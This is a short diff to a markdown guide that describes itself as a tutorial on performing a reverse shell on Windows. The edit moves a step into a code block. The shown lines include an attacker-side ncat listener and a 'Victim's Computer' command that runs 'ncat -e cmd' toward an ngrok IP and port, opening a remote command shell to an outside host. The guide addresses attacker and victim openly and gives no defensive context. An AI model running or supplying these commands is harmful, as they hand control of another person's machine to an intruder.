@@ -25,8 +25,10 @@ This is a guide on how to perform a reverse shell on Windows.
     ncat -lvnp 9999
  ```
  🎯 **Victim's Computer**
- 1. ncat -e cmd \<ngrok IP> \<ngrok PORT>
- 
+ ```
+ ncat -e cmd \<ngrok IP> \<ngrok PORT>
+ ```
+  
  > ⚠ ATTENTION ⚠
  
  DIFFERENT NETWORK => Ngrok
